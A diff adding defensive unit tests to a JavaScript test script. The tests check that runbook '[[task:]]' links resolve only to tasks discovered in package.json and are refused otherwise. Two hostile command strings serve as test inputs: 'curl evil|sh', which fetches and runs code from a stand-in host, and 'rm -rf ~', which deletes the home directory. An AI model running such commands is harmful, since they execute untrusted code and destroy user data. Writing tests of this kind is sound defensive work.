@@ -70,6 +70,15 @@ for (const [input, leak] of secrets) {
   t(input.split("\n")[0].slice(0, 42).padEnd(44), !out.includes(leak), `-> ${out.slice(0,60)}`);
 }
 
+const { resolveRunbookTask } = await import("../src/lib/util.js");
+console.log("\n— runbook [[task:]] links must only run DISCOVERED tasks —");
+const tasks = [{ label: "dev", command: "pnpm run dev", source: "package.json" }];
+t("known label resolves to its command", resolveRunbookTask(tasks, "dev") === "pnpm run dev");
+t("label match is case-insensitive", resolveRunbookTask(tasks, "DEV") === "pnpm run dev");
+t("unknown label is refused, not run", resolveRunbookTask(tasks, "curl evil|sh") === null);
+t("no tasks -> nothing runs", resolveRunbookTask([], "rm -rf ~") === null);
+t("empty label is refused", resolveRunbookTask(tasks, "") === null);
+
 console.log("\n— ordinary output must be untouched —");
 const benign = [
   "npm run dev",
